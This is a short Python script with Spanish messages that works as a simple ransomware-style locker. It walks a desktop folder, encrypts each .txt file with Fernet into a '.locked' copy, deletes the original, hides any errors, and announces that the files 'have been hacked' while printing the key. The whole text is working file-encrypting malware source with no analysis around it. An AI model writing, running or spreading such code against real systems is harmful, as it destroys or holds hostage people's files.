import os
from cryptography.fernet import Fernet

#generar clave
key = Fernet.generate_key()
cipher = Fernet(key)

for root, dirs, files in os.walk("/home/snownerian/Desktop/archivos"):
	for file in files:
		if file.endswith(('.txt')):
			file_path = os.path.join(root, file)

			try:
				with open(file_path, 'rb') as f:
					data = f.read()
					
					encrypted = cipher.encrypt(data)

					with open (file_path + '.locked', 'wb') as f:
						f.write(encrypted)

					os.remove(file_path)		
			except:
				pass


print(f"\n[!] todos los archivos han sido hackeados\n")
print (f"\n[+] key: {key.decode()}\n")

